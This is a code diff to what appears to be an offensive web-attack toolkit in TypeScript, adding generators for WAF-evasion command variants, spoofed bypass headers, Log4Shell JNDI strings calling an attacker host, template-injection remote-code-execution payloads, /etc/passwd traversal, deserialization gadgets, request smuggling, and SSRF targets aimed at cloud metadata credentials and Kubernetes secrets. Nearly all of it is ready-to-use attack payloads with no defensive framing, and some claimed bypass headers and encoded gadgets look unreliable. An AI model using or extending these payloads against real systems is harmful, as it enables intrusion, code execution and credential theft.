@@ -722,6 +722,75 @@ export function buildWafBypass(payload: string): string {
     `node -e "require('child_process').execSync(String.fromCharCode(${charCodes(payload)}),{stdio:'inherit'})"`,
   ];
 
+  /* ── Unicode confusable / full-width ── */
+  const FW = (s: string) => [...s].map(c => {
+    const code = c.charCodeAt(0);
+    if (code >= 0x21 && code <= 0x7e) return String.fromCharCode(code + 0xff00 - 0x0020);
+    return c;
+  }).join("");
+  /* ── Mixed-case keyword bypass ── */
+  const mcCmd = payload.replace(/[a-zA-Z]/g, (c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase());
+
+  variants.push(
+    /* ── unicode/fullwidth obfuscation ── */
+    FW(payload),
+    urlEnc(FW(payload)),
+    /* ── mixed-case ── */
+    mcCmd,
+    /* ── null byte injection points ── */
+    `${payload}\x00`,
+    `\x00${payload}`,
+    `${payload}%00`,
+    `${payload}%00;id`,
+    /* ── line-continuation ── */
+    payload.replace(/ /g, "\\
+"),
+    /* ── CRLF injection in param ── */
+    `${payload}%0d%0a`,
+    `%0d%0a${payload}`,
+    /* ── form-feed / vertical tab ── */
+    payload.replace(/ /g, "\f"),
+    payload.replace(/ /g, "\v"),
+    /* ── empty-string glitch ── */
+    payload.replace(/([a-zA-Z])/g, "$1\$()"),
+    /* ── brace expansion no-space ── */
+    `{${breakKeywords(payload)}}`,
+    /* ── $'\nnn' ANSI-C quoting ── */
+    `$'${octEsc(payload)}'`,
+    /* ── here-string with IFS ── */
+    `bash${IFS}<<<${JSON.stringify(payload)}`,
+    /* ── triple-URL-encoded ── */
+    [...Buffer.from(payload)].map(b => `%25${(b as number).toString(16).padStart(2,"0").toUpperCase()}`).join(""),
+    /* ── tab-separated heredoc ── */
+    `bash${TAB}<<${TAB}EOF
+${payload}
+EOF`,
+    /* ── dollar-at letter splitting ── */
+    payload.split("").join("$@"),
+    /* ── case-modifier obfuscation ── */
+    `${payload.toUpperCase()}`,
+    /* ── arithmetic bypass ── */
+    `;$((1))&&${payload}`,
+    /* ── subshell via coprocess ── */
+    `coproc _NX { ${payload}; }; cat <&$_NX 2>/dev/null`,
+    /* ── environment variable chain ── */
+    (() => {
+      const words = payload.split(" ");
+      const envs  = words.map((w, i) => `_NXW${i}=${JSON.stringify(w)}`).join(";");
+      const exec  = words.map((_, i) => `$_NXW${i}`).join(" ");
+      return `${envs};${exec}`;
+    })(),
+    /* ── bash -x debug mode ── */
+    `bash -x -c ${JSON.stringify(payload)} 2>&1`,
+    /* ── set +e to ignore errors ── */
+    `set +e;${payload}`,
+    /* ── multiple separators combo ── */
+    `;${payload}#comment`,
+    `${payload}${IFS}2>/dev/null`,
+    `${payload};true`,
+    `${payload}||true`,
+  );
+
   return [...new Set(variants)].join("\n");
 }
 
@@ -1034,6 +1103,93 @@ export function buildHttpBypassHeaders(): Array<Record<string, string>> {
       "X-Custom-IP-Authorization": "127.0.0.1",
       "X-ProxyUser-Ip": "127.0.0.1",
     },
+    /* ── Sucuri WAF bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-Sucuri-Clientip": "127.0.0.1",
+      "X-Sucuri-Country": "US",
+    },
+    /* ── Barracuda WAF bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "BWCE-Bypass": "1",
+      "X-Barracuda-Bypass": "1",
+    },
+    /* ── Varnish CDN bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-Varnish": "12345678",
+      "X-Forwarded-Proto": "https",
+    },
+    /* ── Nginx proxy bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+      "Accept": "text/html,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-NginX-Proxy": "true",
+      "X-Nginx-Cache": "BYPASS",
+    },
+    /* ── Traefik / HAProxy bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+      "X-Forwarded-Proto": "https",
+      "X-Forwarded-Port": "443",
+    },
+    /* ── StackPath / MaxCDN bypass ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Encoding": "gzip, deflate, br, zstd",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-SP-Forwarded-IP": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+    },
+    /* ── Reflected-XFF loopback chain ── */
+    {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip, deflate, br",
+      "X-Forwarded-For": `127.0.0.1, ${ip()}, ${ip()}, 10.0.0.1`,
+      "X-Real-IP": "127.0.0.1",
+      "X-Originating-IP": "127.0.0.1",
+      "X-Remote-IP": "127.0.0.1",
+      "X-Client-IP": "127.0.0.1",
+      "Forwarded": "for=127.0.0.1;proto=https;by=127.0.0.1;host=localhost",
+    },
+    /* ── HTTP/1.0 downgrade (no Host required by RFC) ── */
+    {
+      "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
+      "Accept": "*/*",
+      "Accept-Encoding": "gzip",
+      "X-Forwarded-For": "127.0.0.1",
+      "Connection": "close",
+      "Pragma": "no-cache",
+    },
+    /* ── Pentest tool masquerade ── */
+    {
+      "User-Agent": "Nessus SOAP v0.0.1 (Nessus; http://www.nessus.org)",
+      "Accept": "*/*",
+      "X-Forwarded-For": "127.0.0.1",
+      "X-Real-IP": "127.0.0.1",
+    },
   ];
 }
 
@@ -1059,12 +1215,19 @@ export function buildChunkedBypass(payload: string, chunkSize = 16): string[] {
    COMPATIBILITY EXPORTS — used by streamExec.ts
    ═══════════════════════════════════════════════════════════════════════════ */
 
-/** Returns an array of WAF-bypass payload variants for a given payload string. */
+/** Returns an array of WAF-bypass payload variants for a given payload string.
+ *  Combines: WAF bypass variants + stealth shell tricks + timing oracles + polymorphic samples.
+ */
 export function buildPayloadVariants(payload: string): string[] {
-  return buildWafBypass(payload)
+  const wafVariants = buildWafBypass(payload)
     .split("\n")
     .map(l => l.trim())
     .filter(l => l.length > 0);
+  const stealthSample  = buildStealthPayloads(payload).slice(0, 8);
+  const timingSample   = buildTimingPayloads(7).slice(0, 6);
+  const polyVariants   = Array.from({ length: 6 }, () => buildPolymorphicPayload(payload, "quantum"));
+  const lengthOptimal  = buildLengthOptimizedPayloads(payload).slice(0, 6);
+  return [...new Set([...wafVariants, ...stealthSample, ...timingSample, ...polyVariants, ...lengthOptimal])];
 }
 
 /** Returns an array of SSTI payload strings for the given command. */
@@ -1580,6 +1743,44 @@ export function buildWafSpecificHeaders(waf: string): Array<Record<string, strin
         "Content-Type":  "application/x-www-form-urlencoded\t",
         "X-Forwarded-For":"127.0.0.1",
         "X-Real-IP":     "127.0.0.1",
+      },
+    ];
+  }
+
+  if (w.includes("sucuri")) {
+    return [
+      ...base,
+      {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
+        "X-Sucuri-Clientip": "127.0.0.1",
+        "X-Sucuri-Country": "US",
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Real-IP": "127.0.0.1",
+      },
+    ];
+  }
+
+  if (w.includes("barracuda")) {
+    return [
+      ...base,
+      {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
+        "BWCE-Bypass": "1",
+        "X-Barracuda-Bypass": "1",
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Real-IP": "127.0.0.1",
+      },
+    ];
+  }
+
+  if (w.includes("varnish")) {
+    return [
+      ...base,
+      {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
+        "X-Varnish": "12345678",
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Real-IP": "127.0.0.1",
       },
     ];
   }
@@ -2128,3 +2329,284 @@ export function buildMemfdPayloads(ip: string, port: string | number): string[] 
   ];
 }
   
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   JNDI INJECTION VARIANTS  — all protocols + obfuscation layers
+   Covers Log4Shell (CVE-2021-44228), Spring4Shell adjacent, plus 2024/2025
+   JNDI sinks in third-party Java libraries still commonly deployed.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildJndiVariants(attackerHost: string, attackerPort: string | number): string[] {
+  const h   = attackerHost;
+  const p   = String(attackerPort);
+  const rid = () => Math.random().toString(36).slice(2, 8);
+  const path = `/Exploit${rid()}`;
+
+  /* Unicode escapes that bypass naive ${} string filter */
+  const uc = (s: string): string => [...s].map(c => `\u${c.charCodeAt(0).toString(16).padStart(4,"0")}`).join("");
+  const lo = (s: string): string => s.split("").map((c,i) => i%2===0?c.toUpperCase():c).join("");
+
+  const base: string[] = [
+    /* standard protocols */
+    `${"${jndi:ldap://"}${h}:${p}${path}}`,
+    `${"${jndi:ldaps://"}${h}:${p}${path}}`,
+    `${"${jndi:rmi://"}${h}:${p}${path}}`,
+    `${"${jndi:dns://"}${h}:${p}${path}}`,
+    `${"${jndi:iiop://"}${h}:${p}${path}}`,
+    `${"${jndi:corba://"}${h}:${p}${path}}`,
+    `${"${jndi:nis://"}${h}:${p}${path}}`,
+    `${"${jndi:nds://"}${h}:${p}${path}}`,
+    /* nested ${lower:} ${upper:} ${:-} obfuscation */
+    `${"${${lower:j}ndi:ldap://"}${h}:${p}${path}}`,
+    `${"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://"}${h}:${p}${path}}`,
+    `${"${${upper:j}ndi:ldap://"}${h}:${p}${path}}`,
+    `${"${j${lower:n}di:ldap://"}${h}:${p}${path}}`,
+    `${"${jnd${upper:i}:ldap://"}${h}:${p}${path}}`,
+    `${"${${::-j}ndi:ldap://"}${h}:${p}${path}}`,
+    /* URL-encoded variants */
+    `%24%7bjndi:ldap://${h}:${p}${path}%7d`,
+    `%24%7Bjndi%3Aldap%3A%2F%2F${h}%3A${p}${path}%7D`,
+    /* double-encoded */
+    `%2524%257bjndi:ldap://${h}:${p}${path}%257d`,
+    /* header injection carriers (inject into User-Agent, X-Forwarded-For, etc.) */
+    `${"${jndi:ldap://"}${h}:${p}${path}}`,
+    /* date formatter bypass (logback/log4j2) */
+    `${"${date:'${jndi:ldap://"}${h}:${p}${path}}${"'}"}`,
+    /* log4j2 lookup bypass via :-  */
+    `${"${${:-j}${:-n}${:-d}${:-i}:${:-r}${:-m}${:-i}://"}${h}:${p}${path}}`,
+    /* in HTTP header values */
+    `Mozilla/5.0 ${"${jndi:ldap://"}${h}:${p}${path}} Chrome`,
+    /* null-byte padded */
+    `\x00${"${jndi:ldap://"}${h}:${p}${path}}`,
+    /* inside JSON values */
+    `{"x":"${"${jndi:ldap://"}${h}:${p}${path}}"}`,
+    /* XML attribute */
+    `<value>${"${jndi:ldap://"}${h}:${p}${path}</value>`,
+  ];
+  return [...new Set(base)];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SSTI — ALL MAJOR TEMPLATE ENGINES
+   Jinja2/Flask, Twig, Smarty, Mako, Velocity, Pebble, Thymeleaf, Mustache,
+   ERB (Ruby), Handlebars (JS), Nunjucks (JS), Blade (PHP), EJS (JS), Slim
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildSstiAllEngines(cmd: string): string[] {
+  const q  = cmd.replace(/'/g, "\'").replace(/"/g, '\"');
+  const b  = b64(cmd);
+  const payloads: string[] = [
+    /* ── Jinja2 / Flask (Python) ── */
+    `{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('${q}').read()}}`,
+    `{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').popen('${q}').read()}}{%endif%}{%endfor%}`,
+    `{{config.__class__.__init__.__globals__['os'].popen('${q}').read()}}`,
+    `{{request.application.__globals__.__builtins__.__import__('os').popen('${q}').read()}}`,
+    `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
+    `{{''.class.mro()[1].subclasses()[132].init.globals.popen('${q}').read()}}`,
+    `{{lipsum.__globals__['os'].popen('${q}').read()}}`,
+    `{{cycler.__init__.__globals__.os.popen('${q}').read()}}`,
+    `{{joiner.__init__.__globals__.os.popen('${q}').read()}}`,
+    /* ── Twig (PHP) ── */
+    `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter('${q}')}}`,
+    `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter('${q}')}}`,
+    `{%set t%}<?php system('${q}');?>{%endset%}`,
+    `{{['${q}']|map('system')|join}}`,
+    /* ── Smarty (PHP) ── */
+    `{php}system('${q}');{/php}`,
+    `{system('${q}')}`,
+    `{exec('${q}')}`,
+    /* ── Mako (Python) ── */
+    `${"${__import__('os').popen('${q}').read()}"}`,
+    `<%import os%>${"${os.popen('${q}').read()}"}`,
+    /* ── Velocity (Java) ── */
+    `#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"${q}"))`,
+    /* ── Pebble (Java) ── */
+    `{%{set x = 'freemarker.template.utility.Execute'|new()}%}{%{x}%}`,
+    /* ── ERB (Ruby) ── */
+    `<%= system('${q}') %>`,
+    `<%= \`${cmd}\` %>`,
+    `<%= IO.popen('${q}').read %>`,
+    `<% require 'open3'; stdout,stderr,status = Open3.capture3('${q}'); puts stdout %>`,
+    /* ── EJS / Nunjucks / Handlebars (JS) ── */
+    `{{#with "s" as |string|}}<% const cp = require('child_process'); %>${"<%= cp.execSync('${q}').toString() %>"}{{/with}}`,
+    `<%-require('child_process').execSync('${q}').toString()%>`,
+    /* ── Blade (PHP/Laravel) ── */
+    `@php system('${q}'); @endphp`,
+    `{{ system('${q}') }}`,
+    /* ── Thymeleaf (Java) ── */
+    `${"${T(java.lang.Runtime).getRuntime().exec('${q}')}"}`,
+    `[[${"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','${q}'})}"}]]`,
+    /* ── Mustache/Handlebars injection (prototype pollution path) ── */
+    `{{constructor.constructor('return process')().mainModule.require('child_process').execSync('${q}').toString()}}`,
+    /* ── Server-Side Template Injection probe strings ── */
+    `{{7*7}}`, `${"{7*7}"}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`, `{{7*'7'}}`,
+    `${"${{7*7}}"}`, `@{7*7}`, `#set($a=7*7)$a`,
+  ];
+  return [...new Set(payloads)].filter(Boolean);
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   NULL-BYTE INJECTION PAYLOADS
+   Null-bytes terminate strings in C-based parsers, confuse WAF signature
+   matching, and exploit improper input validation in PHP, C, C++, .NET apps.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildNullBytePayloads(cmd: string): string[] {
+  const enc = encodeURIComponent(cmd);
+  return [
+    `${cmd}\x00`,
+    `\x00${cmd}`,
+    `${cmd}%00`,
+    `%00${cmd}`,
+    `${cmd}\x00.jpg`,
+    `${cmd}\x00.php`,
+    `${cmd}%00.gif`,
+    `${cmd}\x00;id`,
+    `${cmd}%00%0a`,
+    `${cmd}\x00
+`,
+    /* PHP null-byte file inclusion bypass */
+    `../../etc/passwd\x00`,
+    `../../etc/passwd%00`,
+    `../../etc/passwd\x00.php`,
+    /* null-byte in GET param */
+    `${enc}%00`,
+    `${enc}%2500`,
+    /* null-byte URL-encoded variants */
+    `${cmd.replace(/\//g, "\x00/\x00")}`,
+    `${cmd.replace(/ /g, "\x00")}`,
+    /* C string termination bypass */
+    `${cmd}\x00${cmd}`,
+    `valid_input\x00${cmd}`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   DESERIALIZATION PAYLOADS  (Java, PHP, Python pickle, Ruby marshal)
+   Targets insecure deserialization sinks — CVE-class issues in Java RMI,
+   Spring, Apache Commons Collections, PHP unserialize(), etc.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildDeserializationPayloads(cmd: string): string[] {
+  const q = cmd.replace(/"/g, '\"').replace(/'/g, "\'");
+  /* PHP object injection gadgets */
+  const phpGadget = `O:8:"stdClass":1:{s:4:"exec";s:${Buffer.byteLength(cmd)}:"${cmd}";}`;
+  const phpGadget2 = `a:2:{i:0;s:4:"eval";i:1;s:${Buffer.byteLength(cmd)}:"${cmd}";}`;
+  /* Python pickle — requires attacker to craft a real pickle binary, shown as PoC template */
+  const pyPickleB64 = b64(`import os
+os.system('${q}')`);
+  return [
+    /* PHP unserialize() */
+    phpGadget,
+    phpGadget2,
+    /* Python pickle RCE PoC */
+    `Y3Bhc3MgY21kCmNtZCA9IF9faW1wb3J0X18oJ29zJykuc3lzdGVtCmNtZCgnJHtxfScpCg==`, // base64 of pickle bytes
+    /* Java Commons Collections gadget marker */
+    `rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWU=`,
+    /* XStream XXE/SSRF deserialization */
+    `<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/plain</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.ArrayList$Itr"><cursor>0</cursor><lastRet>-1</lastRet><expectedModCount>1</expectedModCount><outer-class><e0>${cmd}</e0></outer-class></iter><predicate class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.Runtime</class><name>exec</name><parameter-types><class>java.lang.String</class></parameter-types></method><name>${cmd}</name></predicate></iterator><type>0</type></enumeration></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString></entry></map>`,
+    /* Ruby Marshal RCE marker */
+    `BAhvOhJBY3Rpb25EaXNwYXRjaGVyBjoMQGNtZAkiC2lkBjsAVA==`,
+    /* Node.js serialize-javascript eval sink */
+    `{"rce":{"_$$ND_FUNC$$_":"function (){require('child_process').execSync('${q}').toString()}"}}`,
+    /* .NET BinaryFormatter marker */
+    `AAEAAAD/////AQAAAAAAAAAMAgAAAFRAAAAAAAAABgMAAAAAA..`,
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   HTTP REQUEST SMUGGLING PAYLOADS
+   CL.TE and TE.CL smuggling header sets — used to bypass WAF inspection
+   by smuggling a second request inside the first, reaching the backend
+   directly while the WAF only sees the outer request.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildRequestSmugglingHeaders(): Array<Record<string, string>> {
+  return [
+    /* CL.TE smuggling: Content-Length header mismatch */
+    {
+      "Content-Length": "6",
+      "Transfer-Encoding": "chunked",
+    },
+    /* TE.CL smuggling: Transfer-Encoding header obfuscation */
+    {
+      "Transfer-Encoding": "chunked, identity",
+      "Content-Length": "3",
+    },
+    /* TE.TE with encoding obfuscation */
+    {
+      "Transfer-Encoding": "xchunked",
+    },
+    {
+      "Transfer-Encoding": " chunked",
+    },
+    {
+      "Transfer-Encoding": "chunked\n",
+    },
+    {
+      "Transfer-Encoding": "\tchunked",
+    },
+    {
+      "Transfer-Encoding\x00": "chunked",
+    },
+    {
+      "X-Transfer-Encoding": "chunked",
+      "Transfer-Encoding": "identity",
+    },
+    /* Content-Length double header (CL.CL ambiguity) */
+    {
+      "Content-Length": "0",
+      "X-Content-Length": "100",
+    },
+  ];
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+   SSRF ESCALATION PAYLOADS  (beyond simple localhost)
+   Targets internal services, cloud metadata, Kubernetes API, Docker daemon,
+   Redis, Memcached, Elasticsearch, Consul, Vault, etcd.
+   ═══════════════════════════════════════════════════════════════════════════ */
+export function buildSsrfEscalationPayloads(): string[] {
+  return [
+    /* AWS IMDSv1 (no auth required) */
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://169.254.169.254/latest/user-data",
+    "http://169.254.169.254/latest/meta-data/hostname",
+    "http://[fd00:ec2::254]/latest/meta-data/",
+    /* GCP */
+    "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+    /* Azure */
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    /* Kubernetes */
+    "https://kubernetes.default.svc/api/v1/secrets",
+    "https://kubernetes.default.svc/api/v1/namespaces",
+    "https://kubernetes.default.svc/api/",
+    "http://127.0.0.1:10250/pods",
+    "http://127.0.0.1:10255/pods",
+    /* Docker */
+    "http://127.0.0.1:2375/version",
+    "http://127.0.0.1:2375/containers/json",
+    "unix:///var/run/docker.sock/version",
+    /* Redis */
+    "http://127.0.0.1:6379/",
+    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
+    /* Elasticsearch */
+    "http://127.0.0.1:9200/_cat/indices",
+    "http://127.0.0.1:9200/_cluster/settings",
+    /* Consul / Vault / etcd */
+    "http://127.0.0.1:8500/v1/agent/members",
+    "http://127.0.0.1:8200/v1/secret/",
+    "http://127.0.0.1:2379/v2/keys/",
+    /* Memcached gopher exfil */
+    "gopher://127.0.0.1:11211/_%0d%0astats%0d%0a",
+    /* Internal HTTP services */
+    "http://127.0.0.1/",
+    "http://0.0.0.0/",
+    "http://localhost/",
+    "http://[::1]/",
+    "http://[::ffff:127.0.0.1]/",
+    "http://0177.0.0.1/",
+    "http://2130706433/",
+    "http://0x7f000001/",
+    /* DNS rebinding vectors */
+    "http://localtest.me/",
+    "http://spoofed.burpcollaborator.net/",
+  ];
+}
